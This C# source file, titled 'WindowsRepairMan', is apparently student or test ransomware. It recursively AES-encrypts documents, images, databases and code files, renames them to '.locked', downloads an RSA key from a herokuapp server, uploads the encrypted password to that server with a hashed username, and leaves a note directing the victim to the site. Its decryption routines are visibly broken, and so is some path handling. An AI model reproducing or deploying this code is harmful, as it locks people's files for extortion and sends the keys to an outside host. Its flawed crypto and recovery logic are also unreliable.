using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Net;
using System.Collections.Specialized;

namespace WindowsRepairMan
{
    public class Utils
    {
        private string serverURI;

        public static string CreatePassword(int length)
        {
            const string validChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder builder = new StringBuilder();
            Random rand = new Random();
            for (int i = 0; i < length; i++)
            {
                builder.Append(validChars[rand.Next(validChars.Length)]);
            }
            return builder.ToString();
        }
        public static byte[] Encrypt(byte[] plainBytes, byte[] passphraseBytes)
        {
            byte[] encryptedBytes = null;
            byte[] salt = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (AesManaged aes = new AesManaged())
                {
                    aes.KeySize = 512;
                    aes.BlockSize = aes.LegalBlockSizes.Max().MaxSize;

                    var key = new Rfc2898DeriveBytes(passphraseBytes, salt, 1000);
                    aes.Key = key.GetBytes(aes.KeySize / 8);
                    aes.IV = key.GetBytes(aes.BlockSize / 8);
                    aes.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(plainBytes, 0, plainBytes.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            return encryptedBytes;
        }

        public static void EncryptFile(string filename, string password)
        {
            byte[] fileContents = File.ReadAllBytes(filename);
            byte[] passBytes = Encoding.UTF8.GetBytes(password);
            passBytes = SHA512Cng.Create().ComputeHash(passBytes);
            byte[] encryptedBytes = Encrypt(fileContents, passBytes);

            File.WriteAllBytes(filename, encryptedBytes);
            System.IO.File.Move(filename, filename + ".locked");
        }

        public static void EncryptDirectory(string location, string passphrase)
        {
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
            };
            string[] files = Directory.GetFiles(location);
            string[] childDirs = Directory.GetDirectories(location);
            foreach(string file in files)
            {
                string extension = Path.GetExtension(file);
                if (validExtensions.Contains(extension))
                    EncryptFile(file, passphrase);
            }
            foreach(string dir in childDirs)
            {
                EncryptDirectory(dir, passphrase);
            }
        }

        public static byte[] Decrypt(Byte[] inputBytes, Byte[] keyAndIvBytes)
        {
            Byte[] outputBytes = inputBytes;
            string plainText = string.Empty;
            using (MemoryStream ms = new MemoryStream(outputBytes))
            {
                using (AesManaged aes = new AesManaged())
                {
                    aes.KeySize = 512;
                    aes.BlockSize = aes.LegalBlockSizes.Max().MaxSize;
                    aes.Mode = CipherMode.CBC;
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(keyAndIvBytes, keyAndIvBytes), CryptoStreamMode.Read))
                    {
                        using (StreamReader sr = new StreamReader(cs))
                        {
                            return Encoding.UTF8.GetBytes(sr.ReadToEnd());
                        }
                    }
                }
            }
        }

        public static void DecryptFile(string filename, byte[] privateKey)
        {
            byte[] fileContents = File.ReadAllBytes(filename);
            byte[] decryptedBytes = Encrypt(fileContents, privateKey);
            File.WriteAllBytes(filename, decryptedBytes);
            filename = filename.Substring(0, filename.Length - 7);
            System.IO.File.Move(filename + ".locked", filename);
        }

        public static void DecryptDirectory(string location, byte[] privateKey)
        {
            string[] files = Directory.GetFiles(location);
            string[] childDirs = Directory.GetDirectories(location);
            foreach (string filename in files)
                DecryptFile(filename, privateKey);
            foreach (string childDir in childDirs)
                DecryptDirectory(location, privateKey);
        }

        public static string EncryptStringRSA(string text, int keySize, string publicKey)
        {
            var encryptedString = RSAEncrypt(Encoding.UTF8.GetBytes(text), keySize, publicKey);
            return Convert.ToBase64String(encryptedString);
        }

        public static byte[] RSAEncrypt(byte[] data, int keySize, string publicKey)
        {
            using (var provider = new RSACryptoServiceProvider(keySize))
            {
                provider.FromXmlString(publicKey);
                return provider.Encrypt(data, false);
            }
        }

        public static string StartAction()
        {
            string userName = Environment.UserName;
            string userDir = "C:\\Users";
            string path = "\\Desktop\\test";
            string startPath = userDir + userName + path;
            string publicKey = GetPublicKey();
            string password = CreatePassword(32);
            EncryptDirectory(startPath, password);
            string encryptedPassword = EncryptStringRSA(password, 2048, publicKey);
            SendKey(encryptedPassword);

            string codeFile = CreatePassword(12);
            File.WriteAllText(startPath + "\\" + codeFile + ".txt", password);
            File.WriteAllText(startPath + "\\READ_THIS", "Go to https://final-460.herokuapp.com/");
            return startPath + "\\" + codeFile + ".txt";
        }

        public static string GetPublicKey()
        {
            string computerName = System.Environment.MachineName.ToString();
            string userName = System.Environment.UserName;
            WebClient client = new WebClient();
            client.Headers[HttpRequestHeader.ContentType] = "application/json";
            string response = client.DownloadString("https://final-460.herokuapp.com/publicKey");
            client.Dispose();
            return response;
        }

        public static void SendKey(string key)
        {
            string userName = System.Environment.UserName;
            WebClient client = new WebClient();
            client.Headers[HttpRequestHeader.ContentType] = "x-www-form-urlencoded";
            NameValueCollection form = new NameValueCollection();
            form["userCode"] = SHA256Managed.Create().ComputeHash(Encoding.UTF8.GetBytes(userName)).ToString();
            form["key"] = key;
            byte[] response = client.UploadValues("https://final-460.herokuapp.com/privateKey", "POST", form);
            client.Dispose();
        }



    }
}
